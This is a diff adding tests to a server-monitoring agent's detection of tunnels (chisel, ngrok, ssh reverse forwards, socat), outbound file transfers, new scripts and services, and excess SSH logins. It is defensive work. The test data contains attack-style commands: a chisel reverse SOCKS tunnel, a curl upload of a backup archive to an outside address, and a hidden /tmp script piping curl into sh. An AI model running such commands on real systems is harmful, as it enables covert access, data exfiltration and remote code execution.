@@ -263,3 +263,63 @@ def test_recheck_one_server(client):
     assert anon.post("/api/agent/report", headers=other_auth, json={**BASE, "hostname": "recheck-2"}).json()["security"]["rescan"] is None   # only the chosen server
     assert client.post("/api/security/recheck", headers=CSRF, json={"server": str(sid)}).status_code == 429     # not twice within 30 s
     assert any(e["action"] == "security.recheck" and "recheck-1" in e["detail"] for e in client.get("/api/audit?category=security").json())
+
+
+def test_agent_tunnels_transfers_and_new_files(agent, tmp_path, monkeypatch):
+    kinds = lambda exe, cmd, name="x": {k for _, k, _ in agent.process_flags(100, name, exe, cmd)}   # noqa: E731
+    assert kinds("/usr/local/bin/chisel", "chisel client 203.0.113.5:8080 R:socks") == {"tunnel"}
+    assert agent.tunnel_kind("chisel", "")[0] == "high" and agent.tunnel_kind("ngrok", "ngrok http 80")[0] == "medium"
+    assert agent.tunnel_kind("ssh", "ssh -N -R 8080:localhost:80 user@203.0.113.5") and agent.tunnel_kind("ssh", "ssh deploy@10.0.0.2") is None
+    assert agent.tunnel_kind("socat", "socat TCP-LISTEN:4444,fork TCP:10.0.0.9:22") and agent.tunnel_kind("socat", "socat - UNIX-CONNECT:/run/x") is None
+    assert agent.transfer_kind("curl", "curl -T backup.tar https://203.0.113.5/up") == ("curl uploading a file", True)
+    assert agent.transfer_kind("curl", "curl -fsSL https://example.com") is None
+    assert agent.transfer_kind("scp", "scp -t /root/")[0] == "scp receiving files" and agent.transfer_kind("rsync", "rsync -a /data backup@10.0.0.9:/srv")
+    assert agent.transfer_kind("rclone", "rclone copy /data remote:bucket") == ("rclone copy", True) and agent.transfer_kind("rsync", "rsync -a /a /b") is None
+    # new files and scripts, new services (on a fake host root)
+    root = tmp_path / "host"
+    monkeypatch.setattr(agent, "_host_path", lambda p: str(root / p.lstrip("/")))
+    monkeypatch.setattr(agent, "AGENT_HOST_ROOT", str(root))
+    monkeypatch.setattr(agent, "_home_dirs", lambda: [("deploy", "/home/deploy")])
+    (root / "tmp/.x").mkdir(parents=True); (root / "tmp/.x/run.sh").write_text("#!/bin/sh\ncurl x | sh\n")
+    (root / "home/deploy/app").mkdir(parents=True); (root / "home/deploy/app/deploy").write_text("#!/usr/bin/env bash\necho hi\n")
+    (root / "home/deploy/app/notes.txt").write_text("not a script")
+    (root / "srv/dump").mkdir(parents=True)
+    for i in range(60):
+        (root / f"srv/dump/f{i}.dat").write_text("x")
+    (root / "etc/systemd/system").mkdir(parents=True); (root / "etc/systemd/system/updater.service").write_text("[Service]\nExecStart=/opt/updater/run --quiet\n")
+    found: list[dict] = []
+    agent._new_files(found); agent._new_services(found)
+    by = {f["kind"]: f for f in found}
+    scripts = [f for f in found if f["kind"] == "new_scripts"]
+    assert {f["severity"] for f in scripts} == {"high", "medium"} and any("/tmp/.x/run.sh" in f["detail"] for f in scripts) and any("/home/deploy/app/deploy" in f["detail"] for f in scripts)
+    assert "notes.txt" not in str(scripts)
+    assert by["new_files_burst"]["title"] == "60 new files in /srv/dump"
+    assert by["new_service"]["title"] == "New service: updater.service" and "/opt/updater/run" in by["new_service"]["detail"]
+
+
+def test_ssh_key_details_daily_limit_and_transfers(client, monkeypatch):
+    sign_in(client)
+    monkeypatch.setattr(monitoring, "deliver_event", _real_deliver_event)
+    anon = TestClient(main.app)
+    sid, auth = _enroll(client, anon, "keys-1")
+    client.put("/api/security/schedule", headers=CSRF, json={"scan_hours": 24, "threat_minutes": 10, "updates_hours": 6, "daily_login_alert": 3})
+    login = lambda n: {"ip": "198.51.100.30", "user": "deploy", "method": "publickey", "key_type": "ED25519", "fingerprint": "SHA256:Abc123", "key_name": "sam@laptop", "ts": "", "port": 50000 + n}   # noqa: E731
+    _report(anon, auth, hostname="keys-1", ssh_failures={"total": 0, "ips": {}, "users": {}, "accepted": [login(1), login(2), login(3)],
+                                                         "transfers": [{"ip": "198.51.100.30", "user": "deploy", "kind": "sftp", "ts": ""}]})
+    with database.SessionLocal() as db:
+        assert db.query(AlertEvent).filter_by(state="ssh_login_many").count() == 0                       # 3 logins: at the limit, not over it
+    _report(anon, auth, hostname="keys-1", ssh_failures={"total": 0, "ips": {}, "users": {}, "accepted": [login(4)],
+                                                         "transfers": [{"ip": "198.51.100.30", "user": "deploy", "kind": "sftp", "ts": ""}]})
+    _report(anon, auth, hostname="keys-1", ssh_failures={"total": 0, "ips": {}, "users": {}, "accepted": [login(5)], "transfers": []})
+    with database.SessionLocal() as db:
+        alerts = db.query(AlertEvent).filter_by(state="ssh_login_many").all()
+        assert len(alerts) == 1 and "deploy from 198.51.100.30 (sam@laptop)" in alerts[0].message                   # once per day, says who and with which key
+        many = db.query(SecurityFinding).filter_by(server_id=sid, kind="ssh_many_logins").one()
+        assert many.title == "5 SSH logins today (limit 3)"
+        transfer = db.query(SecurityFinding).filter_by(server_id=sid, kind="file_transfer").one()
+        assert json.loads(transfer.evidence)["sessions"] == 2 and "2 SFTP/scp" in transfer.detail
+    ssh = client.get(f"/api/security/ssh?server={sid}").json()
+    first = next(e for e in ssh["logins"] if e["kind"] == "login")
+    assert (first["key_type"], first["fingerprint"], first["key_name"]) == ("ED25519", "SHA256:Abc123", "sam@laptop")
+    assert any(e["verdict"] == "transfer" for e in ssh["logins"]) and ssh["today"] == [{"id": sid, "name": "keys-1", "logins": 5}] and ssh["daily_limit"] == 3
+    client.put("/api/security/schedule", headers=CSRF, json={"scan_hours": 24, "threat_minutes": 10, "updates_hours": 6, "daily_login_alert": 4})
